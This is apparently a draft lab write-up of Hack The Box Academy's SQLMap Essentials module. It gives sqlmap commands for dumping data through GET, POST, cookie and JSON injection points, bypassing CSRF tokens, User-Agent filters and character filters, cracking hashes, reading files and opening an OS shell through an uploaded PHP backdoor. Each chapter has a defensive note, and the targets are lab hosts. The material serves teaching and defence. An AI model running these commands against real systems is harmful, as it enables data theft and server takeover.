| Field | Value |
|---|---|
| Author | NeroPQ — NERO.SEC |
| Platform | Hack The Box Academy |
| Module | SQLMap Essentials (Module 58) |
| Official URL | https://academy.hackthebox.com/app/module/58 |
| Difficulty | Not verified |
| Category | Web Application Security — SQL Injection / Automated Exploitation |
| Report date | 2026-11-19 |
| Classification | Public lab write-up (flags, hashes and cracked passwords redacted) |
| Publication status | Draft — not approved for publication |

> **Evidence-integrity note.** Every output and screenshot in this report comes from the author's own lab sessions on HTB Academy (Parrot OS PwnBox, 2026-11-19). Most screenshots show sqlmap's *output* but not the command line that produced it; where that is the case the command shown is the one prepared for that case during the session and is labelled as such, not presented as a transcript. Anything that was not captured is marked **EVIDENCE PENDING**. Flags, password hashes and cracked passwords are never published; every screenshot that contained one was redacted with a black box before inclusion. Lab target IPs and ports are ephemeral and are written as `<TARGET_IP>` / `<PORT>` in prose.

## Contents

1. [Overview](#overview)
2. [Learning Objectives](#learning-objectives)
3. [Environment and Evidence Boundaries](#environment-and-evidence-boundaries)
4. [01. SQLMap Overview](#01-sqlmap-overview)
5. [02. Getting Started with SQLMap](#02-getting-started-with-sqlmap)
6. [03. SQLMap Output Description](#03-sqlmap-output-description)
7. [04. Running SQLMap on an HTTP Request](#04-running-sqlmap-on-an-http-request)
8. [05. Handling SQLMap Errors](#05-handling-sqlmap-errors)
9. [06. Attack Tuning](#06-attack-tuning)
10. [07. Database Enumeration](#07-database-enumeration)
11. [08. Advanced Database Enumeration](#08-advanced-database-enumeration)
12. [09. Bypassing Web Application Protections](#09-bypassing-web-application-protections)
13. [10. OS Exploitation](#10-os-exploitation)
14. [11. Skills Assessment — Minishop](#11-skills-assessment--minishop)
15. [Troubleshooting](#troubleshooting)
16. [Results and Evidence](#results-and-evidence)
17. [Security Implications](#security-implications)
18. [Lessons Learned](#lessons-learned)
19. [References](#references)

## Overview

This module teaches **sqlmap**, the open-source tool that automates the detection and exploitation of SQL injection (SQLi). It starts with the injection types sqlmap supports and how to read its output, then moves to building attacks against every part of an HTTP request (GET, POST, cookies, JSON bodies), tuning detection (`--level`, `--risk`, boundaries, UNION column counts), enumerating databases, bypassing simple web protections (anti-CSRF tokens, unique values, User-Agent blacklists, character filters) and finally escalating from the database to the operating system (file read, web shell). A skills assessment against an e-commerce site ("Minishop") chains these techniques together.

The lab exercises are numbered **Case #1** to **Case #11** on a single training application, plus a separate host for OS exploitation and one for the assessment. The report follows the module's section order; each chapter gives the concept, the commands, the evidence and its interpretation, and a defensive note.

## Learning Objectives

- Know the SQLi techniques sqlmap uses (`BEUSTQ`) and which are fastest.
- Point sqlmap at any injection point: query string, POST body, cookie, JSON, or a full request file captured in Burp (`-r`).
- Read sqlmap's output: detection messages, the injection summary block, warnings and saved output paths.
- Tune detection with `--level`, `--risk`, `--prefix`/`--suffix`, `--union-cols`, `--technique`, `--string`.
- Enumerate DBMS banner, users, databases, tables, columns and rows; search the schema; crack dumped hashes.
- Bypass anti-CSRF tokens, unique-value parameters, User-Agent blacklists and character filters (`--csrf-token`, `--randomize`, `--random-agent`, `--tamper`).
- Read files and obtain an OS shell through the database (`--file-read`, `--os-shell`).

## Environment and Evidence Boundaries

| Item | Detail |
|---|---|
| Attacker host | HTB Academy PwnBox (Parrot OS); sqlmap printed "your sqlmap version is outdated" on every run |
| Case #1–#11 target | One HTB training app, pages `caseN.php`; Debian 10 (buster), Apache 2.4.38, MariaDB (MySQL ≥ 5.0); database `testdb` |
| OS Exploitation target | Separate instance (`/?id=1`), same stack |
| Skills Assessment target | "Minishop" e-commerce site, separate instance |
| Network | HTB VPN, roughly 170–240 ms latency (visible in the PwnBox top bar) |
| Evidence available | 16 terminal screenshots from the lab folder plus 3 screenshots shared during the session (Case #5 detection, assessment detection, missing request file) |
| Evidence missing | SQLMap Overview / Getting Started / Output Description (theory sections, no lab output); the exact typed command lines for most cases; a clean re-dump of Case #5; Case #7's injection summary; the Skills Assessment's final dump — see **EVIDENCE PENDING** markers |

> **Scope note.** All targets are HTB-provided lab hosts reached over the HTB VPN. The `users` table dumped in chapter 08 contains synthetic personal data generated for the lab; card-like numbers, password hashes and cracked passwords are still redacted.

## 01. SQLMap Overview

### Concept

sqlmap is a Python tool that detects and exploits SQLi in web applications. Beyond extracting data it can fingerprint the DBMS, crack password hashes, bypass protections with tamper scripts, read/write files and run OS commands. It supports all major DBMSes (MySQL/MariaDB, PostgreSQL, Microsoft SQL Server, Oracle, SQLite and others).

The default technique set is **`BEUSTQ`**:

| Letter | Technique | How data comes back |
|---|---|---|
| B | Boolean-based blind | True/false page differences, one bit at a time |
| E | Error-based | Inside DBMS error messages, chunk by chunk |
| U | UNION query-based | Appended `SELECT` results inside the normal page — whole rows per request |
| S | Stacked queries | Extra statements after `;` (useful for non-`SELECT` actions) |
| T | Time-based blind | Response delay (`SLEEP`), one bit at a time |
| Q | Inline queries | Sub-query embedded in the original query |

Out-of-band (DNS exfiltration) is also supported with `--dns-domain` but needs an attacker-controlled DNS server.

### Question — fastest SQLi type

**Answer: `UNION query-based`.** A UNION payload appends the attacker's own `SELECT` to the original query, so entire result sets (potentially a whole table) return in one response. Error-based is next fastest because each error leaks a chunk of data; boolean and time-based blind are the slowest because they recover data bit by bit, and time-based additionally waits for a delay on every true answer.

> **Evidence note:** this is a knowledge question answered from the module text; there is no lab output for it.

### Defensive perspective

The ordering matters to defenders too: suppressing verbose errors and avoiding reflection of query results removes E and U, forcing an attacker into slow, noisy blind techniques that are much easier to detect in logs.

## 02. Getting Started with SQLMap

### Concept

The basic workflow is to give sqlmap a URL with a parameter and let it test:

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

| Option | Purpose |
|---|---|
| `-h`, `-hh` | Basic / advanced help |
| `-u` | Target URL |
| `--batch` | Accept default answers to every prompt (non-interactive) |
| `--dump`, `-T`, `-D` | Dump a table / choose table / choose database |
| `-v 0-6` | Verbosity |

`--batch` is used throughout this report to avoid interactive prompts; where a prompt's default answer would be wrong this is called out.

> **Evidence note:** theory section; no lab output captured.

## 03. SQLMap Output Description

### Concept

Recognising sqlmap's messages shortens every later case:

| Message (abridged) | Meaning |
|---|---|
| `target URL content is stable` | Responses are consistent, so differences can be attributed to payloads |
| `GET parameter 'id' appears to be dynamic` | Changing the value changes the page — a candidate |
| `heuristic (basic) test shows that ... might be injectable (possible DBMS: 'MySQL')` | A quick syntax-breaking test produced a DBMS error |
| `reflective value(s) found and filtering out` | Payload is echoed in the page; sqlmap strips it before comparing |
| `appears to be '<technique>' injectable (with --string="...")` | Boolean injection confirmed; `--string` is the text used to recognise TRUE pages |
| `parameter 'id' is vulnerable. Do you want to keep testing the others?` | A working injection was found |
| `sqlmap identified the following injection point(s)` | The summary block: Type / Title / Payload for each technique |
| `fetched data logged to text files under '...'` | Session and dumps are stored under `~/.local/share/sqlmap/output/<host>/` |

The session directory is why re-running a command is fast (results are resumed) and also why a bad result keeps coming back until `--flush-session` or `--fresh-queries` is used (see chapter 06, Case #5).

> **Evidence note:** theory section; every one of these messages appears in later figures.

## 04. Running SQLMap on an HTTP Request

### Concept

Injection points are not only in the query string. sqlmap can target:

| Location | Option |
|---|---|
| POST body | `--data 'id=1'` |
| Cookie | `--cookie='id=1'` (tested from `--level 2`, or marked with `*`) |
| Custom header | `-H 'X-Header: 1*'` |
| JSON / XML body | `--data '{"id":1}'` — sqlmap detects the format and asks to process it |
| Any of the above, exactly as the browser sends it | `-r request.txt` (saved from Burp: *Copy to file*) |

An asterisk (`*`) inside any value marks a custom injection point. `-r` is the most reliable option because method, headers, cookies and body match the real request.

### Case #2 — POST parameter `id`

```bash
# command as prepared for this case (command line not in the screenshot)
sqlmap -u 'http://<TARGET_IP>:<PORT>/case2.php' --data 'id=1' --batch --dump -T flag2
```

![sqlmap dumping testdb.flag2 with the flag redacted](/writeups/evidence/htb-sqlmap-essentials/04-running-sqlmap-on-an-http-request/case2-post-flag2-redacted.jpg "Back-end fingerprint (Debian 10, Apache 2.4.38, MariaDB) and the one-row dump of testdb.flag2 (flag redacted). With no -D, sqlmap warns that it will use the current database.")

**Result:** flag obtained, redacted.

### Case #3 — Cookie value `id`

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case3.php' --cookie='id=1*' --batch --dump -T flag3
```

![Injection summary for the cookie parameter and dump of flag3](/writeups/evidence/htb-sqlmap-essentials/04-running-sqlmap-on-an-http-request/case3-cookie-flag3-redacted.jpg "Three techniques confirmed on the cookie value: stacked queries (id=1;SELECT SLEEP(5)#), time-based blind and a 10-column UNION. testdb.flag3 dumped (flag redacted).")

**Result:** flag obtained, redacted.

### Case #4 — JSON body `{"id":1}`

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case4.php' --data '{"id":1}' -H 'Content-Type: application/json' --batch --dump -T flag4
# alternative: save the request from Burp and run  sqlmap -r case4.txt --batch --dump -T flag4
```

![JSON payloads in the injection summary and dump of flag4](/writeups/evidence/htb-sqlmap-essentials/04-running-sqlmap-on-an-http-request/case4-json-flag4-redacted.jpg "Payloads are written inside the JSON value ({'id':'1 AND (SELECT ... SLEEP(5)...)'}): stacked queries, time-based blind, 6-column UNION. testdb.flag4 dumped (flag redacted).")

**Result:** flag obtained, redacted.

### Defensive perspective

Moving a parameter into a cookie, a POST body or JSON does not protect it; sqlmap treats every location equally. The only fix is parameterised queries for every input source, including cookies and API bodies.

## 05. Handling SQLMap Errors

### Concept

When sqlmap fails silently, the following options show why:

| Option | Use |
|---|---|
| `--parse-errors` | Print DBMS errors found in responses |
| `-t traffic.txt` | Save every request and response to a file |
| `-v 3` … `-v 6` | Show payloads (3), request headers (4), response headers (5), full bodies (6) |
| `--proxy http://127.0.0.1:8080` | Route through Burp to inspect traffic in HTTP history |

> **Evidence note:** this section has no lab question. The same ideas were used to diagnose real problems later in the session: a message about a missing request file (chapter 11) and a page-stability error (`there was an error checking the stability of page because of lack of content`, Figure 11.2), whose suggested fix is a higher verbosity level.

## 06. Attack Tuning

### Concept

By default sqlmap uses `--level 1` (fewer injection points and payload boundaries) and `--risk 1` (no `OR`-based or heavy queries). When detection fails, these options widen the search:

| Option | Effect |
|---|---|
| `--level 1-5` | More boundaries (prefix/suffix pairs) and more injection points (cookies at 2, User-Agent/Referer at 3, Host at 5) |
| `--risk 1-3` | Risk 2 adds heavy time-based queries; risk 3 adds `OR`-based payloads, which may modify data on real targets |
| `--prefix`, `--suffix` | Supply the exact boundary when the query context is unusual |
| `--union-cols`, `--union-char`, `--union-from` | Help UNION detection when column counting fails |
| `--technique BEU...` | Restrict techniques to save time |
| `--string`, `--not-string`, `--code`, `--titles`, `--text-only` | Tell sqlmap how to recognise a TRUE page |

### Case #5 — OR-based injection (needs `--risk 3`)

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case5.php?id=1' --level=5 --risk=3 --batch --dump -T flag5
```

![sqlmap finding OR boolean-based blind with --string='32'](/writeups/evidence/htb-sqlmap-essentials/06-attack-tuning/case5-or-boolean-detection.jpg "The basic heuristic says id 'might not be injectable' and AND boolean-based blind fails, but OR boolean-based blind - WHERE or HAVING clause succeeds (with --string='32'). This payload class only exists at --risk 3.")

The first dump was corrupted:

![Corrupted blind dump of flag5](/writeups/evidence/htb-sqlmap-essentials/06-attack-tuning/case5-corrupted-blind-dump-redacted.jpg "sqlmap retrieves a 31-character value, but the middle of it is junk (characters such as }, y and [ in a pattern that is not readable text). Value redacted.")

### Interpretation

Boolean blind rebuilds each character from a series of TRUE/FALSE comparisons. With an `OR` payload the page for a FALSE condition can still look TRUE-ish, and any unstable response flips a bit. The readable prefix and suffix were correct, and the length (31) was correct, so the error was confined to individual characters. sqlmap also stores the bad value in its session, so a plain re-run prints the same corrupted string.

The recovery is to re-retrieve the value one request at a time:

```bash
sqlmap -u 'http://<TARGET_IP>:<PORT>/case5.php?id=1' --level=5 --risk=3 --technique=B --threads=1 --fresh-queries --batch --dump -T flag5
```

> **EVIDENCE PENDING / honesty note:** the clean re-dump was not captured. The submitted answer was reconstructed from the readable parts of Figure 06.2 (same length, readable leetspeak phrase) and accepted by the platform. Flag redacted.

### Case #6 — Non-standard boundaries (`--prefix`)

The vulnerable parameter is `col`, a column name inside the query, so the payload must first close a backtick and a parenthesis.

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case6.php?col=id' --prefix='`)' --batch --dump -T flag6
```

![Payloads starting with col=id') and dump of flag6](/writeups/evidence/htb-sqlmap-essentials/06-attack-tuning/case6-prefix-flag6-redacted.jpg "Every payload begins with col=id') — the custom prefix at work — for a heavy-query time-based blind and a 6-column UNION. testdb.flag6 dumped (flag redacted).")

**Result:** flag obtained, redacted.

### Case #7 — UNION with a fixed column count (`--union-cols`)

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case7.php?id=1' --union-cols=5 --technique=U --batch --dump -T flag7
```

![Dump of flag7](/writeups/evidence/htb-sqlmap-essentials/06-attack-tuning/case7-union-flag7-redacted.jpg "testdb.flag7 dumped in one second (flag redacted).")

> **Evidence note:** the screenshot starts after the injection summary, so the technique and column count used are not visible. The very fast dump is consistent with UNION, but `--union-cols=5` is recorded as the prepared command, not as verified output.

**Result:** flag obtained, redacted.

### Defensive perspective

Attack tuning shows that "sqlmap didn't find it" is not evidence of safety: unusual query contexts (`ORDER BY` column names, backticks, parentheses) and OR-only conditions are still exploitable once the boundary is known. Scanners should be run at high level/risk against test environments, and identifiers such as column names must be validated against an allow-list because they cannot be parameterised.

## 07. Database Enumeration

### Concept

After an injection is confirmed, sqlmap enumerates in stages:

| Option | Returns |
|---|---|
| `--banner` | DBMS version string |
| `--current-user`, `--current-db` | Account and database in use |
| `--is-dba` | Whether that account is a DB administrator |
| `--dbs`, `--tables`, `--columns` | Databases, tables, columns |
| `--dump` with `-D`, `-T`, `-C` | Rows, optionally limited to columns |
| `--start`, `--stop`, `--where` | Row ranges and conditions |
| `--dump-all --exclude-sysdbs` | Everything except system schemas |

Dumps are also written to CSV under the session directory.

### Case #1 — flag1 in `testdb`

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case1.php?id=1' --batch -D testdb -T flag1 --dump
```

![Injection summary and dump of testdb.flag1](/writeups/evidence/htb-sqlmap-essentials/07-database-enumeration/case1-flag1-redacted.jpg "Time-based blind and a 6-column UNION confirmed on id; testdb.flag1 dumped to .../dump/testdb/flag1.csv (flag redacted).")

**Result:** flag obtained, redacted.

### Defensive perspective

The application account could read every table in `testdb`. Least privilege (a separate account per application function, no access to unrelated tables) limits what one injection can expose.

## 08. Advanced Database Enumeration

### Concept

| Option | Purpose |
|---|---|
| `--schema` | Structure of all tables |
| `--search -T/-C/-D <word>` | Find tables, columns or databases whose name contains a string (`LIKE`) |
| `--passwords` | Dump DBMS user password hashes |
| Automatic hash cracking | When a dump contains hashes, sqlmap offers a dictionary attack with its built-in wordlist |
| `--all --batch` | Everything (slow) |

### Question 1 — column containing "style"

```bash
sqlmap -u 'http://<TARGET_IP>:<PORT>/case1.php?id=1' --batch --search -C style
```

![--search -C style finding PARAMETER_STYLE in information_schema.ROUTINES](/writeups/evidence/htb-sqlmap-essentials/08-advanced-database-enumeration/search-column-style.jpg "The search finds one column, PARAMETER_STYLE (varchar(8)) in information_schema.ROUTINES. The follow-up prompt to dump its entries was answered Y, which fails with 'permission denied' — irrelevant to the question, which only asks for the name.")

**Result:** `PARAMETER_STYLE`.

### Question 2 — Kimberly's password

```bash
# command as prepared for this question
sqlmap -u 'http://<TARGET_IP>:<PORT>/case1.php?id=1' --batch -D testdb -T users --dump
```

With `--batch`, sqlmap accepts the offer to crack recognised hashes using its default dictionary.

![users table dump with cracked passwords and sensitive columns redacted](/writeups/evidence/htb-sqlmap-essentials/08-advanced-database-enumeration/users-dump-cracked-redacted.jpg "testdb.users (synthetic lab data). The password column held 40-hex-character hashes, consistent with unsalted SHA-1, and most were cracked by the built-in dictionary, appearing in parentheses after each hash. Row 6 is Kimberly Wright. The password column and the card-like number column are redacted.")

**Result:** Kimberly's password was recovered from the cracked hash. Value redacted.

### Defensive perspective

Unsalted fast hashes fell to a small built-in wordlist in seconds. Passwords must be stored with a slow, salted algorithm (bcrypt, scrypt, Argon2). Card-like data and personal details in the same table as credentials make a single injection a full data breach.

## 09. Bypassing Web Application Protections

### Concept

| Protection | Bypass |
|---|---|
| Anti-CSRF token in the form | `--csrf-token=<param>` — sqlmap fetches a fresh token before each request |
| Parameter that must be unique per request | `--randomize=<param>` |
| Value computed from another parameter (e.g. a hash) | `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"` |
| IP blocking | `--proxy`, `--tor --check-tor` |
| WAF detection | sqlmap tests automatically; `--skip-waf` to skip |
| User-Agent blacklist | `--random-agent` |
| Character / keyword filters | `--tamper=<script>` (list with `--list-tampers`) |
| Chunked transfer, HTTP parameter pollution | `--chunked`, `--hpp` |

### Case #8 — Anti-CSRF token

```bash
# command as prepared for this case; token value taken from the page/Burp
sqlmap -u 'http://<TARGET_IP>:<PORT>/case8.php' --data='id=1&t0ken=<TOKEN>' --csrf-token='t0ken' --batch --dump -T flag8
```

![6-column UNION payload and dump of flag8](/writeups/evidence/htb-sqlmap-essentials/09-bypassing-web-application-protections/case8-csrf-flag8-redacted.jpg "6-column UNION confirmed; the payload line wraps and ends in a token parameter (partly visible). The application is identified as PHP. testdb.flag8 dumped (flag redacted).")

**Result:** flag obtained, redacted. The token parameter name is from the prepared command; only its tail is visible in the figure.

### Case #9 — Unique value per request

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case9.php?id=1&uid=12345' --randomize=uid --batch --dump -T flag9
```

![Payload ending with &uid=12345 and dump of flag9](/writeups/evidence/htb-sqlmap-essentials/09-bypassing-web-application-protections/case9-randomize-flag9-redacted.jpg "The time-based payload at the top ends in &uid=12345, confirming the extra parameter (sqlmap prints the template value; --randomize replaces it in each real request). 6-column UNION; testdb.flag9 dumped (flag redacted).")

**Result:** flag obtained, redacted.

### Case #10 — Primitive protection (User-Agent blacklist)

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case10.php' --data='id=1' --random-agent --batch --dump -T flag10
```

![Injection summary with a 9-column UNION and dump of flag10](/writeups/evidence/htb-sqlmap-essentials/09-bypassing-web-application-protections/case10-user-agent-flag10-redacted.jpg "Stacked queries, time-based blind and a 9-column UNION; testdb.flag10 dumped (flag redacted).")

> **Evidence note:** the screenshot does not show the command line or User-Agent, so the use of `--random-agent` is recorded from the prepared command, not from visible output.

**Result:** flag obtained, redacted.

### Case #11 — Filtering of `<` and `>`

```bash
# command as prepared for this case
sqlmap -u 'http://<TARGET_IP>:<PORT>/case11.php?id=1' --tamper=between --batch --dump -T flag11
```

The `between` tamper rewrites `>` as `NOT BETWEEN 0 AND #` and `=` as `BETWEEN # AND #`, so comparisons survive the filter.

![Tamper warning and blind retrieval of flag11](/writeups/evidence/htb-sqlmap-essentials/09-bypassing-web-application-protections/case11-tamper-flag11-redacted.jpg "changes made by tampering scripts are not included in shown payload content(s) confirms a tamper script was active. Data is pulled character by character (single-thread blind); testdb.flag11 dumped (flag redacted).")

**Result:** flag obtained, redacted.

### Defensive perspective

Each protection here is a speed bump, not a control. CSRF tokens, nonce parameters and User-Agent checks are all reproduced by the client, so an automated client reproduces them too; blacklisting characters fails because SQL has many equivalent ways to express a comparison. These may add detection value (e.g. alerting on `BETWEEN`-heavy queries or bursts of new tokens), but the injection itself is only fixed by parameterised queries.

## 10. OS Exploitation

### Concept

If the database account has file privileges (MySQL `FILE`, empty `secure_file_priv`) and the DBMS runs on the same host as the web server, SQLi becomes host access:

| Option | Effect |
|---|---|
| `--is-dba` | Check for administrative DB privileges |
| `--file-read <path>` | Read a file through `LOAD_FILE()`; saved locally |
| `--file-write <local> --file-dest <remote>` | Write a file through `INTO OUTFILE` |
| `--os-shell` | Upload a stager and a PHP backdoor into a writable web directory, then relay commands |

### Question 1 — Read `/var/www/html/flag.txt`

```bash
# command as prepared for this question
sqlmap -u 'http://<TARGET_IP>:<PORT>/?id=1' --batch --file-read '/var/www/html/flag.txt'
cat ~/.local/share/sqlmap/output/<TARGET_IP>/files/_var_www_html_flag.txt
```

![--file-read falling back to UNION and saving flag.txt (31 bytes)](/writeups/evidence/htb-sqlmap-essentials/10-os-exploitation/file-read-flag-txt-redacted.jpg "Time-based retrieval fails, sqlmap falls back to the simpler UNION technique and prints the file as hex (redacted). It confirms the local and remote files have the same size (31 B) and saves the file to the session's files/ directory.")

### Interpretation

The hex printed on screen was cut off, so decoding it gives only part of the flag; the complete value is in the saved file. The successful read proves the DB account has file-read rights.

**Result:** flag obtained from the saved file, redacted.

### Question 2 — OS shell and the second flag

```bash
sqlmap -u 'http://<TARGET_IP>:<PORT>/?id=1' --batch --os-shell
# if the UNION-based shell returns no output:
sqlmap -u 'http://<TARGET_IP>:<PORT>/?id=1' --batch --os-shell --technique=E
```

First shell — working directory listing:

![os-shell in /var/www/html showing flag.txt, stager and backdoor](/writeups/evidence/htb-sqlmap-essentials/10-os-exploitation/os-shell-webroot-listing-redacted.jpg "The backdoor tmpbvsyk.php is uploaded into /var/www/html/. ls -la shows flag.txt (root-owned, 31 bytes — the file from Question 1), the stager tmpuqvmn.php owned by mysql (written by the database through INTO OUTFILE) and the backdoor owned by www-data. cat flag.txt returns the same flag as Question 1 (redacted). The first command, ls-la, failed with not found because of the missing space.")

Second shell — error-based technique, flag in `/`:

![os-shell via error-based technique reading /flag.txt](/writeups/evidence/htb-sqlmap-essentials/10-os-exploitation/os-shell-error-based-root-flag-redacted.jpg "An error-based payload (FLOOR(RAND(0)*2) against INFORMATION_SCHEMA.PLUGINS) is in use. Prompts: language 4 (PHP), writable directory 1 (common locations). /var/www/ is denied, /var/www/html/ succeeds (stager tmpumkdu.php, backdoor tmpberfq.php). cat /flag.txt returns the second flag (redacted).")

**Result:** OS command execution as the web server user verified; second flag at `/flag.txt` obtained, redacted.

### Defensive perspective

This chain needed three misconfigurations: a DB account with `FILE` privilege, an empty `secure_file_priv`, and a web root writable by the MySQL user (`basic.php` and the stager in Figure 10.2 are owned by `mysql`). Removing any one of them stops the escalation. The leftover `tmp*.php` files are also a clear forensic indicator; sqlmap does not always clean them up.

## 11. Skills Assessment — Minishop

### Task

The assessment gives only a target and asks for the contents of the table `final_flag`. The hint is to browse the site for attack vectors and combine the bypass techniques from chapter 09.

### Recon

The site is "Minishop", an e-commerce front end (home, catalog, checkout pages). Public walkthroughs of this assessment identify the attack vector as the **Add to Cart** function on `shop.html`, which sends `POST /action.php` with a JSON body `{"id":1}` (from a JavaScript function at the bottom of the page).

> **EVIDENCE PENDING:** a Burp capture of the `action.php` request was not saved; the request below was written by hand from that description. It is verified indirectly: sqlmap accepted it and found the JSON `id` parameter (Figure 11.2).

### Building the request file

The first attempt failed because no request file existed yet:

![sqlmap CRITICAL: specified HTTP request file 'req.txt' does not exist](/writeups/evidence/htb-sqlmap-essentials/11-skills-assessment/req-file-missing.jpg "Two runs stop immediately with specified HTTP request file 'req.txt' does not exist.")

```bash
cat > req.txt << 'EOF'
POST /action.php HTTP/1.1
Host: <TARGET_IP>:<PORT>
Content-Type: application/json
Content-Length: 8

{"id":1}
EOF
```

### Detection

```bash
sqlmap -r req.txt -p id --batch --random-agent --tamper=between --level=5 --risk=3 -D production -T final_flag --dump
```

![sqlmap processing the JSON body and flagging 'JSON id' as possibly injectable](/writeups/evidence/htb-sqlmap-essentials/11-skills-assessment/action-php-json-detection.jpg "sqlmap loads the between tamper, picks a random browser User-Agent, detects JSON in the POST body and reports that (custom) POST parameter 'JSON id' might be injectable (possible DBMS: 'MySQL'). A stability error appears because the endpoint returns almost no content. At --level 5 --risk 3 the run then spends about 20 seconds on each boolean-based variant.")

### Interpretation and tuning

The heuristic hit confirms the vector. Because the response barely changes, boolean techniques have nothing to compare, which is why they are slow and fail; public walkthroughs report that the working technique is **time-based blind**, in a database named `production`. The run was stopped and restricted to that technique:

```bash
sqlmap -r req.txt -p id --batch --random-agent --tamper=between --technique=T --level=5 --risk=3 -D production -T final_flag --dump
```

`--threads` was deliberately not used: concurrent time-based requests over a 170–240 ms VPN produce wrong characters, as seen in Case #5.

> **EVIDENCE PENDING:** the time-based detection summary and the final dump of `final_flag` were not captured. The flag was obtained and accepted by the platform (redacted). The database name `production` and the time-based technique are taken from public walkthroughs and are consistent with the session, but are not shown in the author's evidence.

### Defensive perspective

The assessment combined the module's protections on one endpoint: a JSON API (not obvious from the HTML forms), a User-Agent blacklist and a character filter. None of them stopped exploitation; together they only made it slower. A parameterised query in `action.php` would have removed the whole chain.

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `CRITICAL: specified HTTP request file 'req.txt' does not exist` | Request was never saved to disk | Save from Burp (*Copy to file*) or write it with a heredoc (chapter 11) |
| Case #5 dump contains junk characters but the correct length | Unstable TRUE/FALSE responses with an OR payload during bit-by-bit retrieval | Re-dump with `--technique=B --threads=1 --fresh-queries` |
| Re-running prints the same wrong value | Value cached in the sqlmap session | `--fresh-queries` (re-query values) or `--flush-session` (discard session) |
| Long waits testing irrelevant techniques at `--level 5 --risk 3` | sqlmap tries every boolean/error variant first | Press Ctrl+C, choose `e` (end detection), or restrict with `--technique` |
| `--search` prompt to dump entries ends in `permission denied` | Read access to `information_schema.ROUTINES` rows is restricted | Answer `n`; the column name is already listed |
| `--file-read` hex output looks truncated | Long line cut off in the terminal | Read the saved file under `.../output/<host>/files/` |
| `os-shell> ls-la` → `not found` | Typo (missing space) | `ls -la` |
| UNION-based OS shell unreliable | `something went wrong with full UNION technique` | Use `--technique=E` (Figure 10.3) |
| `there was an error checking the stability of page because of lack of content` | Endpoint returns almost nothing | Expected for `action.php`; use time-based, or raise `-v` to inspect |
| `your sqlmap version is outdated` on every run | PwnBox ships an older sqlmap | Harmless for this module |

## Results and Evidence

| Chapter | Question | Result | Verification |
|---|---|---|---|
| 01 SQLMap Overview | Fastest SQLi type | **UNION query-based** | Module text (no lab output) |
| 04 HTTP Request | Case #2 — flag2 (POST) | Flag obtained | Verified — Figure 04.1; flag redacted |
| 04 HTTP Request | Case #3 — flag3 (cookie) | Flag obtained | Verified — Figure 04.2; flag redacted |
| 04 HTTP Request | Case #4 — flag4 (JSON) | Flag obtained | Verified — Figure 04.3; flag redacted |
| 06 Attack Tuning | Case #5 — flag5 (OR, `--risk 3`) | Flag accepted | Detection verified (Figure 06.1); dump corrupted (Figure 06.2); clean re-dump **EVIDENCE PENDING** |
| 06 Attack Tuning | Case #6 — flag6 (`--prefix`) | Flag obtained | Verified — Figure 06.3; flag redacted |
| 06 Attack Tuning | Case #7 — flag7 (`--union-cols`) | Flag obtained | Dump verified (Figure 06.4); technique/column count not shown |
| 07 Database Enumeration | Case #1 — flag1 | Flag obtained | Verified — Figure 07.1; flag redacted |
| 08 Advanced Enumeration | Column containing "style" | **`PARAMETER_STYLE`** | Verified — Figure 08.1 |
| 08 Advanced Enumeration | Kimberly's password | Cracked from hash | Verified — Figure 08.2; value redacted |
| 09 Bypassing Protections | Case #8 — flag8 (CSRF token) | Flag obtained | Verified — Figure 09.1; flag redacted |
| 09 Bypassing Protections | Case #9 — flag9 (`--randomize`) | Flag obtained | Verified — Figure 09.2; flag redacted |
| 09 Bypassing Protections | Case #10 — flag10 (User-Agent) | Flag obtained | Dump verified (Figure 09.3); `--random-agent` not visible |
| 09 Bypassing Protections | Case #11 — flag11 (tamper) | Flag obtained | Verified — Figure 09.4; flag redacted |
| 10 OS Exploitation | Read `/var/www/html/flag.txt` | Flag obtained | Verified — Figures 10.1, 10.2; flag redacted |
| 10 OS Exploitation | Flag via OS shell | `/flag.txt` read through `--os-shell` | Verified — Figure 10.3; flag redacted |
| 11 Skills Assessment | Contents of `final_flag` | Flag accepted | Vector and detection verified (Figure 11.2); final dump **EVIDENCE PENDING** |

Evidence files (19 screenshots) live under `public/writeups/evidence/htb-sqlmap-essentials/<section>/`. Every image that contained a flag, password hash, cracked password or card-like number was redacted before inclusion. No flag, hash or secret appears in this document.

## Security Implications

- **Every input location is injectable.** GET, POST, cookies, JSON bodies and column-name parameters were all exploited the same way; moving a parameter does not protect it.
- **Detection defaults are not a safety verdict.** Case #5 and Case #6 were invisible to a default scan and fully exploitable once `--risk` or the prefix was adjusted.
- **Client-side and request-shape protections fail against automation.** CSRF tokens, unique values, User-Agent filtering and character blacklists were each bypassed with one option.
- **Weak password storage multiplies the impact.** Unsalted 40-hex hashes were cracked by a built-in dictionary in the same run that dumped them.
- **Database privileges decide whether SQLi becomes RCE.** `FILE` privilege, an empty `secure_file_priv` and a web root writable by `mysql` turned a query bug into a shell as `www-data`.
- **sqlmap leaves traces.** `tmp*.php` stagers/backdoors in the web root and bursts of `SLEEP`/`BETWEEN`/`UNION` payloads in logs are reliable indicators for defenders.

## Lessons Learned

1. Capture the real request (`-r` from Burp) before tuning anything; it removes guesswork about method, headers and body format.
2. Read the first detection lines: "heuristic ... might be injectable" and "appears to be ... injectable" tell you whether to tune or move on.
3. Restrict `--technique` as soon as the working technique is known; at high level/risk, untargeted runs waste most of the time limit.
4. Blind extraction over a high-latency VPN must run single-threaded; corrupted characters are a symptom of threads plus unstable responses, and `--fresh-queries` is needed to replace a cached bad value.
5. When a terminal line is truncated (hex file contents), trust the file sqlmap saved, not the screen.
6. Answer sqlmap's follow-up prompts deliberately; the default `Y` sometimes starts work the question does not need.
7. Capture the command line in each screenshot. Several figures here prove the result but not the exact options used, which weakens the evidence even when the answer is correct.

## References

- Hack The Box Academy — SQLMap Essentials: https://academy.hackthebox.com/app/module/58
